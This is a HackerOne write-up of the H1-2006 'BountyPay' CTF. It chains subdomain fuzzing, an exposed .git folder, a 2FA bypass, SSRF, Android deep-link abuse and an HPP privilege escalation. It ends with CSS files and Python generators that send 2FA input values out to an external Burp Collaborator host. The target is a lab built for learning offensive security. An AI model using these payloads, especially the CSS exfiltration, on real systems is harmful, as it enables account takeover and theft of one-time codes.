# [H1-2006 2020] Bounty Pay CTF challenge

## Report Details
- **Report ID**: 895798
- **URL**: https://hackerone.com/reports/895798
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-06-11T05:09:27.850Z
- **Disclosed**: 2020-06-18T00:08:40.209Z

## Reporter
- **Username**: 0xfd
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
# [H1-2006 2020] Bounty Pay CTF challenge

Hi there! This is my H1-2006 CTF writeup submission.
First of all, thanks for the great challenge!
This was my first H1 CTF that I played. I really enjoyed doing it and I learned new things solving this challenge.
In my case, it was the demonstration that I have decent knowledge about security :D 

## Summary:
I resumed the solution of the CTF in one image :) 

{F863480}

## Writeup:
All the history started with a simple HackerOne tweet which said that @martenmichkos needs help: 

{F863481}

After that, I started my road following the link in the tweet and I discovered that the target has a wildcard:
`*.bountypay.h1ctf.com`

So, I first searched on `https://crt.sh/?q=%25.bountypay.h1ctf.com` and that was all I needed to find some subdomains of the target: 

{F863483}

After saved the subdomains to one file, I ran [FFUF](https://github.com/ffuf/ffuf) with a small wordlist ([common.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/0a39d3dcb46c3f3412e7199d634c7cf52ef04c0b/Discovery/Web-Content/common.txt)) against them, with the objective to find hidden paths:

```sh
$ for subodomain in $(cat subdomains.txt); do ffuf -u "https://${subodomain}/FUZZ" -w common.txt -mc 200,301; done
```

At the first sight, one result won my total attention: `.git/HEAD` in `app.bountypay.h1ctf.com`, so I decided to try with another [common paths inside that folder](https://githowto.com/git_internals_git_directory) and... `.git/config` had public access too. 

{F863486}

After downloaded the file, I found a link to the repository which, for my luck it was public too. This one contained an only file that referred to another public php file on the same app.

{F863487}

That file, contained base64 encoded login credentials about a user logged in the page before, so.. **1FA successfull**

{F863488}

But then, I had another step, **bypass the 2FA challenge**. 
Analyzing the source I discovered that the form used to send the verification code had 4 parameters in the request: `username`, `password`, `challenge` and `challenge_answer`.
Three of them, I saw together before... in the log file. 

So, I decided to send the POST without the challenge value like the log, but it didn't work. Also, I tried just adding the code found in the file, but, no.
After checked the form again, I saw that the challenge input value has a MD5 format, so I tried to decrypt, but again, no luck. 
Then, I decided to do the inverse process, sending the challenge_answer value that I found in the log file and changing the challenge value to the md5 encryption of the answer... and works :)

- challenge_answer="bD83Jk27dQ" 
- challenge = md5("bD83Jk27dQ")

{F863490}

I had got full access control to an account in the BountyPay App :) 
 
Since there, the things went more interesting. 
After some times recognise the app I found two important things:
1. The app had an endpoint which return a list of user's statements. That data, was obtained by a request from the backend to the API. In the endpoint's response, I could see, the URL that was requested as well as the data it returned.
2. The token was an base64 encoded json which had a hash and an account_id.

So then, joining the findings...
I modified the account's value in the token and I realized that I could modify the request's path = **SSRF**

{F863495}

With this way, first I thought fuzz `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/*` but I didn't find something that helped me.
Then, I checked the results of my first fuzzing and check manually each subdomain that I found before. With this approach I realized two things:
1. `https:///api.bountypay.h1ctf.com` had an Open Redirect
2. `https:///software.bountypay.h1ctf.com` had IP Access Restriction

So... maybe I could apply something to use the redirect and get access to software.
Something... Something... Something... Path Traversal, of course! 
And it worked!

{F863509}

Because I only could make GET requests, try to bypass the login wasn't an option. 
So, I tried to bruteforce the software subdomain with burp intruder: 

{F863510}

Seeing the results, I got the url and I was able to download the apk file in `https://software.bountypay.h1ctf.com/uploads/bountypay.apk` 

{F863511}

For the Android APP, I use [jadx-gui](https://github.com/skylot/jadx) for decompile and [genymotion](https://www.genymotion.com/) + [adb](https://developer.android.com/studio/command-line/adb/?gclid=Cj0KCQjwiYL3BRDVARIsAF9E4GefdiEZsaDpxxw7mi_5dI6vRa6_PJ1mhj1QxpcPveu2K6ki2QuQCp8aArxZEALw_wcB&gclsrc=aw.ds) like always. 

So, I installed the app with adb: 

```sh
$ adb install BountyPay.apk
Performing Streamed Install
Success
```
and open the apk with the decompiler: 

```sh
$ jadx-gui BountyPay.apk 
```
With jadx I could see 5 activities: `MainActivity`, `PartOneActivity`, `PartTwoActivity`, `PartThreeActivity`, `CongratsActivity`. 

{F863513}

And in the `AndroidManifest.xml` I discovered 3 activities this could be accessed via deep links: 
- `PartOneActivity` via `one://part`
- `PartTwoActivity` via `two://part`
- `PartThreeActivity` via `three://part`

```xml
<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_three" android:name="bounty.pay.PartThreeActivity">
    <intent-filter android:label="">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="three" android:host="part"/>
    </intent-filter>
</activity>
<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_two" android:name="bounty.pay.PartTwoActivity">
    <intent-filter android:label="">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="two" android:host="part"/>
    </intent-filter>
</activity>
<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity">
    <intent-filter android:label="">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="one" android:host="part"/>
    </intent-filter>
</activity>
```

I thought everything was resolved in that way, but before, I decided to watch the app dinamically.
So, first I created an user on the app: 

{F863515}

After that, when I arrived to the first activity, a hint popped up and it finished to confirm my doubts.

{F863516}

So, I went back to jadx to read some code source:

```java
public void onCreate(Bundle savedInstanceState) {
    ...
    if (!settings.contains("USERNAME")) {
    ...
            startActivity(new Intent(this, MainActivity.class));
        }
    if (getIntent() != null && getIntent().getData() != null && (firstParam = getIntent().getData().getQueryParameter("start")) != null && firstParam.equals("PartTwoActivity") && settings.contains("USERNAME")) {
        ...
        startActivity(new Intent(this, PartTwoActivity.class));
    }
```

Clearly, if I would send a deeplink with those params, I could escalate to the other fragment:
(And of course, I needed to be registed like I was already be)

I did that with an adb command:

```sh
adb shell am start -a android.intent.action.VIEW -d "one://part?start=PartTwoActivity" bounty.pay
Starting: Intent { act=android.intent.action.VIEW dat=one://part?start=PartTwoActivity pkg=bounty.pay }
```

And I got access to the second activity: 

{F863517}

Again I went to jadx to see some codesource, and there I realized that I needed to solve the activity in two steps.
In the first one, I sent an Intent similar to the previous activity beacuse I want to show the components: 

```java
public void onCreate(Bundle savedInstanceState) {
    ...
    if (!settings.contains("USERNAME")) {
       ...
        startActivity(new Intent(this, MainActivity.class));
    }
    if (!settings.contains("PARTONE")) {
        ...
        startActivity(new Intent(this, MainActivity.class));
    }
    if (getIntent() != null && getIntent().getData() != null) {
        Uri data = getIntent().getData();
        String firstParam = data.getQueryParameter("two");
        String secondParam = data.getQueryParameter("switch");
        if (firstParam != null && firstParam.equals("light") && secondParam != null && secondParam.equals("on")) {
            editText.setVisibility(0);
            button.setVisibility(0);
            textview.setVisibility(0);
        }
    }
}
```

```sh
adb shell am start -a android.intent.action.VIEW -d "two://part?switch=on\&two=light" bounty.pay
Starting: Intent { act=android.intent.action.VIEW dat=one://part?start=PartTwoActivity pkg=bounty.pay }
```

The lights came on:
{F863520}

For the second part of the activity, I decided not complicate the reversing process, so, [I setuped a debugger for smagli code](https://medium.com/@ghxst.dev/static-analysis-and-debugging-on-android-using-smalidea-jdwp-and-adb-b073e6b9ae48):
tl;dr; Basically you from the APK generate the smagli source code to attatch the Android Process and debug the apk. 

After the setup, I only needed to put a breakpoint and see the other value of the equal :) 

{F863524}

So then, I only wrote `X-Token` in the edit text and I went to the Third Activity. 

{F863525}

This last part was also consist in two steps: 
1. Send deeplink to change the visivility of some components: 

```java
public class PartThreeActivity extends AppCompatActivity {
...
private static final String KEY_USERNAME = "user_created";
...
final String directory = "aG9zdA==";
final String directoryTwo = "WC1Ub2tlbg==";
final String headerDirectory = "header";
...
    public void onCreate(Bundle savedInstanceState) {
        ...
        if (getIntent() != null && getIntent().getData() != null) {
            # Name of the parameters:
            String firstParam = data.getQueryParameter("three"); 
            String secondParam = data.getQueryParameter("switch");
            String thirdParam = data.getQueryParameter("header");
            byte[] decodeFirstParam = Base64.decode(firstParam, 0);
            byte[] decodeSecondParam = Base64.decode(secondParam, 0);
            final String decodedFirstParam = new String(decodeFirstParam, StandardCharsets.UTF_8);
            final String decodedSecondParam = new String(decodeSecondParam, StandardCharsets.UTF_8);
            final String str = firstParam;
            final String str2 = secondParam;
            ... 
            AnonymousClass5 r0 = new ValueEventListener() {
                public void onDataChange(DataSnapshot dataSnapshot) {
                    String str;
                    String value = (String) dataSnapshot.getValue();
                    if (str != null && decodedFirstParam.equals("PartThreeActivity") && str2 != null && decodedSecondParam.equals("on") && (str = secondParam2) != null) {
                        if (str.equals("X-" + value)) {
                            editText2.setVisibility(0);
                            button2.setVisibility(0);
                            PartThreeActivity.this.thread.start();
                        }
                    }
                }

                public void onCancelled(DatabaseError databaseError) {
                    Log.e("TAG", "onCancelled", databaseError.toException());
                }
            };
}   
```
From here I knew that I needed to send something similar to the previous activities which in this case were three parameters:

- three = Base64("PartThreeActivity")
- switch = Base64("on")
- header = "X-Token"

```sh
adb shell am start -a android.intent.action.VIEW -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk\=\&switch=b24\=\&header=X-Token" bounty.pay
```

After that, I could see the components of the activity and, in background the app started the process of generate a token for the API, which called to `getHost` and `getToken` methods: 
```java
    /* access modifiers changed from: private */
    public void getHost() {
        final SharedPreferences.Editor editor = getSharedPreferences(KEY_USERNAME, 0).edit();
        this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {
            public void onDataChange(DataSnapshot dataSnapshot) {
                editor.putString("HOST", (String) dataSnapshot.getValue()).apply();
            }

            public void onCancelled(DatabaseError databaseError) {
                Log.e("TAG", "onCancelled", databaseError.toException());
            }
        });
    }

    /* access modifiers changed from: private */
    public void getToken() {
        final SharedPreferences.Editor editor = getSharedPreferences(KEY_USERNAME, 0).edit();
        this.childRefTwo.addListenerForSingleValueEvent(new ValueEventListener() {
            public void onDataChange(DataSnapshot dataSnapshot) {
                editor.putString("TOKEN", (String) dataSnapshot.getValue()).apply();
            }

            public void onCancelled(DatabaseError databaseError) {
                Log.e("TAG", "onCancelled", databaseError.toException());
            }
        });
    }
```
{F863526}
Note: The program that I used to show the log was [pidcat](https://github.com/JakeWharton/pidcat/) but it wasn't necesary to solve the challenge. I just used for the PoC.

Both methods stored the information on shared_preferencies, so I only needed to print the content of the xml file (`user_created.xml`).

```sh
$ adb shell cat /data/data/bounty.pay/shared_prefs/user_created.xml 
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="PARTTWO">COMPLETE</string>
    <string name="USERNAME">0xfd</string>
    <string name="HOST">http://api.bountypay.h1ctf.com</string>
    <string name="PARTONE">COMPLETE</string>
    <string name="TWITTERHANDLE">_0xfd_</string>
    <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
</map
```

To finish the Android Challenge step, I wrote the leaked token in the EditText, and... :

{F863528}

So now, I had directly access to `https://api.bountypay.h1ctf.com` just adding `X-Token: 8e9998ee3137ca9ade8f372739f062c1` in the request's header.

{F863529}

At this point I didn't have much idea how to continue the challenge, so I started fuzzing the API on `/*` and `/api/*` with the hope of find new paths. 
After several minutes, I found the `/api/staff` endpoint which returned me a list of staff users, so, I tried to bruteforce passwords on `https://staff.bountypay.h1ctf.com/?template=login` with those accounts, but it didn't work.
While the bruteforce process was running, I tried with others approachs, like change the HTTP method to POST, and with that I got an interesting response: `400 Bad Request ["Missing Parameter"]`.
For that, I understood that the next step of the challenge was for this way.
I tried with diferents approachs to send data (the same parameters that I recieved with the GET Method) via POST, until with `application/x-www-form-urlencoded`. I found another response `["Staff Member already has an account"]`.
That response was an approximation but something still missing to complete this step.
I tried diferent things like, send a random id but I got another error: `["Invalid Staff ID"]`. I was close, then I decided to leave the challenge for the moment and continue after.
The next day, thinking about the CTF, I remembered that H1 twitter account retweeted something about BountyPay.
I searched on the HackerOne Profile and found the tweet and the account of BountyPay, so I followed the account and search everywhere something that could help me to continue the challenge, and I found it! 
Between the followers I found Sandra, who according to BountyPay's Tweet, she was the new member of it's staff and also, for my luck, she tweeted an image with her staff code. 
In the moment that I saw the code, I ran to the PC and tried the endpoint with her code, and it worked!

{F863530}
{F863535}
{F863536}
{F863537}


So, now I had access to `https://staff.bountypay.h1ctf.com/` with a valid staff account. 

{F863538}

After some time spent in recognise the app I discover a few things: 
- The app is used to report pages and manage support tickets: The app had an enpoint which report a page to the Admin and that created a new support ticket.
- The app use Bootstrap 3.3.7
- I got a reflexion on the input `username` in the login template, **even when I'm already logged**.
- I can update two values of the user: her profile_name and her avatar. Both parameters filtered any char outside [0-9a-zA-Z ]. BUT **the avatar value was injected like css classes in the div**.
- The app has an **interesting js file**: 

 ```js 
 $('.upgradeToAdmin').click(function () {
  let t = $('input[name="username"]').val();
  $.get('/admin/upgrade?username=' + t, function () {
    alert('User Upgraded to Admin')
  })
}),
$('.tab').click(function () {
  return $('.tab').removeClass('active'),
  $(this).addClass('active'),
  $('div.content').addClass('hidden'),
  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),
  !1
}),
$('.sendReport').click(function () {
  $.get('/admin/report?url=' + url, function () {
    alert('Report sent to admin team')
  }),
  $('#myModal').modal('hide')
}),
document.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));
 ```
 
Joining the dots I could reach some conclusions: 
If I change the avatar value of my account to: `tab4%20upgradeToAdmin` and report a page which contains my avatar and imports that js and contain `#tab4` at the end of the location, I could upgrade my account to Admin. 
But I had a big problem, I needed an input which name was equal to username and with the value was equal to 'sandra.allison'. 
So, I decided to search between my burp history and I found an only ocurrence: the login. But unfortunatelly, that template didn't import the js that I needed. 
I got stuck a couple of days in this step, I searched for each CVE associated with the Bootstrap Version, some cases of HPP, searched some way to inject an iframe anywhere but nothing worked. 
Until one day, I sat at the computer, ready to try again all the cases that I had already tried before, and after a few hours... a HPP's payload that I didn't try finally worked!!!
**#TryHarder**

`https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4` 

{F863539}

I only needed to intercept one report request, replace the url value with my enconding URL there, and send the request :) 

{F863547}

Note: `aHR0cHM6Ly9zdGFmZi5ib3VudHlwYXkuaDFjdGYuY29tLz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjQ=` is the base64 value of my payload. I encoded the injection because the endpoint works in this way.

{F863548}

Now I was so close to end the challenge, and I felt it. *brian.oliver* was the test account that I used in *https://app.bountypay.h1ctf.com/* so, those were the Marten Mickos credentials.

After logged into the Marten account with the same way as before, I started the payment process...

{F863549}

But wild 2Fa appeared :/

{F863550}

I tried to bypass in the same way but of course, it didn't work.
So, after a few minutes analizing the situation I discovered that the request send as a parameter a css resource:
```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: https://app.bountypay.h1ctf.com
Connection: close
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
Upgrade-Insecure-Requests: 1

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

The first thing that I tried was change the `app_style` value with the url of my Burp Collaborator, and it worked! The collaborator recieved the request.
Now, I only needed to discover the way how to get the 2FA code with a CSS... 
I saw a few months ago something like ["Extract data via CSS Injection"](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d), so I try something simillar in this case, but for that, I needed to host a css file with an SSL conection.
After some search, I discovered that I could host my own page with `https://pages.github.com/`. Then, I created a repository and host my CSS file, ready for the injection.
First of all, I needed to know what kind of HTTP tags the page used:

```css
/**
Template for the UNI 2FA App
 */

@import url('https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/import.css');

body {
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/body");
}
input{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input");
}
div{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/div");
}
button{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/button");
}
```

With this CSS, I know if the CSS file was correctly imported (because I received the import request) and if almost one HTML element exists. 

In this case, my collaborator recieved 3 requests.
1. /import.css
2. /input
3. /div

I followed my instinct and continued with the input first, and if it didn't work I would continue with the div.
The second version was similar to the blog approach, but in my case, I needed first the name of the input
```css
/**
Template for the UNI 2FA App
 */

@import url('https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/import.css');

body {
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/body");
}
input{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input");
}
input[name^=a]{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputa");
}
input[name^=b]{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputb");
}
...
input[name^=8]{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input8");
}
input[name^=9]{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input9");
}
```

In this case, I recieved 3 requests:
1. /import.css
2. /input
3. /inputc

So, I felt good vibes...
And I was generating successively CSS files like an blind SQLi.
I created a little Python Script for generate the CSS file each time.
```python3
char_list = ['','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','\\.','\\-','_']
base = 'c'

for letter in char_list:
    print('input[name^={}{}]{{'.format(base, str(letter)))
    print('    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input{}{}");'.format(base, str(letter)))
    print('}')
```

Until... in one case I recieved 9 requests:
1. /import.css
2. /input
3. /inputcode_1
4. /inputcode_2
5. /inputcode_3
6. /inputcode_4
7. /inputcode_5
8. /inputcode_6
9. /inputcode_7

Ok... wait.
I remembered that the code that the page expects has 7 chars of length!
So I need to modify my css, and if my speculation would be correct, I only recieve one char for input.

```python3
import urllib.parse
lista = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','\\.','\\-','_','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','\\*','\\\\','\\|','\\/','\\+','\\=','\\@','\\?','\\(','\\)','\\[','\\]','\\?','\\@','\\¿','\\`','\\\'','\\´','\\"','\\{','\\}']

for code in range(7):
    code += 1
    for letter in lista:
        print('input[name=code_{}][value={}]{{'.format(str(code), str(letter)))
        encoded = urllib.parse.quote(str(letter))
        print('    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode{}_{}");'.format(str(code),encoded))
        print('}')
```

And that was :D 

{F863550}

I helped Mårten Mickos to approve May bug bounty payments!

{F863552}

## Impact

I helped Mårten Mickos to approve May bug bounty payments!

## Attachments
- summary.png
- h1_tweet.png
- crt_sh_search.png
- ffuf_git.png
- github.png
- 1FA.png
- 2fa.png
- hash_api.png
- software_api.png
- software_intruder.png
- get_apk.png
- activities.png
- android_login.png
- deeplinks_hint.png
- second_activity.png
- part_two_lights.jpeg
- debbuging.png
- Third_Activity.png
- Third_Activity_lights.png
- congrats_activity.png
- direct_api.png
- bountypay_hq.png
- sandra.png
- sandra_tweet.png
- sandra_request.png
- staff.png
- hpp.png
- admin.png
- admin_credentials.png
- start_payment.png
- payments_2fa.png
- final.png
- flag.jpg
